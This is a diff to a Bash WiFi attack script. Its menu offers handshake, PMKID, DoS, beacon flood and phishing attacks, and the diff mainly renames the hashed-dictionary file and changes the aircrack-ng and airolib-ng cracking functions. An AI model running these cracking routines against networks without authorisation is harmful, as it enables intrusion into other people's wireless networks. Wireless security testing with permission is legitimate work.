@@ -314,28 +314,28 @@ fuerza_.cap() {
 	tput civis; echo -ne "${redColour}[?]$grayColour Dictionary path to use: " && read dicc
 	xterm -hold -e "aircrack-ng -w $dicc $cap"
 }
-#force brute with dictonary precomputed
+#force brute with dictionary precomputed
 fuerza_rainbow() {
 	echo -ne "${greenColour}[?]$grayColour File path .cap : " && read cap
-	cd WifiPwnedd
-	xterm -hold -e "aircrack-ng -r dicc-hasheado $cap" 
+	echo -ne "${greenColour}[?]$grayColour File path dictionary precomputed: " && read pathdictio
+	xterm -hold -e "aircrack-ng -r $pathdictio $cap" 
 }
 #[8] Attack with airolib for the creation of precomputed dictionaries
 rainbowtaibles() {
 	clear; echo -e "\n${yellowColour}[*]$grayColour Starting Rainbow Taibles..."
 	echo -ne "${blueColour}[?]$grayColour Dictionary path: " && read ruta
-	sudo airolib-ng dicc-hasheado --import passwd $ruta > /dev/null 2>&1
-	test -f dicc-hasheado
+	sudo airolib-ng dicc-hashed --import passwd $ruta > /dev/null 2>&1
+	test -f dicc-hashed
 	if [ "$(echo $?)" -eq 0 ]; then
 		echo -ne "${turquoiseColour}[?]$grayColour Essid or Network name: " && read ap 
 		echo "$ap" > essid.lst
-		sudo airolib-ng dicc-hasheado --import essid essid.lst > /dev/null 2>&1
-		sudo airolib-ng dicc-hasheado --clean all 
+		sudo airolib-ng dicc-hashed --import essid essid.lst > /dev/null 2>&1
+		sudo airolib-ng dicc-hashed --clean all 
 		echo -ne "${redColour}[?]$grayColour How many seconds do you want the hasheo process to last?: " && read seg
-		xterm -hold -e "airolib-ng dicc-hasheado --batch" & 
+		xterm -hold -e "airolib-ng dicc-hashed --batch" & 
 		batch_PID=$!
 		sleep ${seg}; kill -9 $batch_PID; wait $batch_PID 2>/dev/null
-		echo -e "\n${greenColour}[+]$grayColour Dictionary finish (name: dicc-hasheado)"
+		echo -e "\n${greenColour}[+]$grayColour Dictionary finish (name: dicc-hashed)"
 		echo -ne "${blueColour}[?]$grayColour Do you want to do a brute force attack with the dictionary? [Y/N]: " && read attak
 		if [ "$attak" == "Y" ] || [ "$attak" == "y" ]; then
 			fuerza_rainbow
@@ -558,7 +558,7 @@ else
 		echo -e "${greenColour}[+]${grayColour} MAC: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
 		echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Wifiphisher\t\t${turquoiseColour}[+]${grayColour} Cracking password"
 		echo -e "${yellowColour}\n[1] Handshake Attack\t\t[6] NTWK phishing\t[7] Force Brute .cap"
-		echo -e "[2] PMKID Attack\t\t\t\t\t[8] dicc-hasheado (Rainbow taibles)"
+		echo -e "[2] PMKID Attack\t\t\t\t\t[8] hashed dictionary (Rainbow taibles)"
 		echo -e "[3] DoS Attack"
 		echo -e "[4] Beacon Flood Attack"
 		echo -e "[5] Scanner"
